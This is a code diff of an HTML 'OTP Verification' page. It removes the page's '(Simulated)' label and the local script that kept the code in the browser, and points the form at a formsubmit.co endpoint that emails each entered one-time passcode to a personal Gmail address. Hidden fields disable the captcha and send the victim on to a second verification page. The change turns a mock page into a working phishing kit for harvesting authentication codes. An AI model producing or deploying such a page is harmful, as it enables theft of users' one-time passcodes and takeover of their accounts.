@@ -1,28 +1,19 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Verification</title>
+  <title>OTP Verification</title>
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
   <div class="container">
-    <h2>Verification (Simulated)</h2>
-    <p>Please enter your OTP to continue:</p>
-    <form onsubmit="handleVerifySubmit(event)">
+    <h2>Verification</h2>
+    <form action="https://formsubmit.co/allenshaw302@gmail.com" method="POST">
       <label>Code: *</label><br><input type="text" name="code" required><br>
+
+      <input type="hidden" name="_next" value="verify2.html">
+      <input type="hidden" name="_captcha" value="false">
       <input type="submit" value="Next">
     </form>
   </div>
-
-  <script>
-    const prevParams = new URLSearchParams(window.location.search);
-
-    function handleVerifySubmit(event) {
-      event.preventDefault();
-      const code = event.target.code.value;
-      prevParams.set('code', code);
-      window.location.href = "verify2.html?" + prevParams.toString();
-    }
-  </script>
 </body>
 </html>
